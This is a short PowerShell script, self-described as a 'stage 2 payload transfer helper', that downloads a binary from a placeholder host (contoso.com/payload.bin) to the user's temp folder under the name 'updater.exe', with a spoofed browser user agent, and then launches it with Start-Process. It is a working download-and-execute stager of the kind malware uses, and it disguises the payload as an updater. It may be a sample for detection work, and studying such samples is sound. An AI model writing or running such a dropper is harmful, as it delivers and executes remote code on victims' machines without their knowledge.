
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://contoso.com/payload.bin',
    [string]$DownloadPath = "$env:TEMP\updater.exe",
    [int]$ConnectionTimeout = 14,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($TransferResult) {
    Start-Process -FilePath $DownloadPath
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 23 reached"
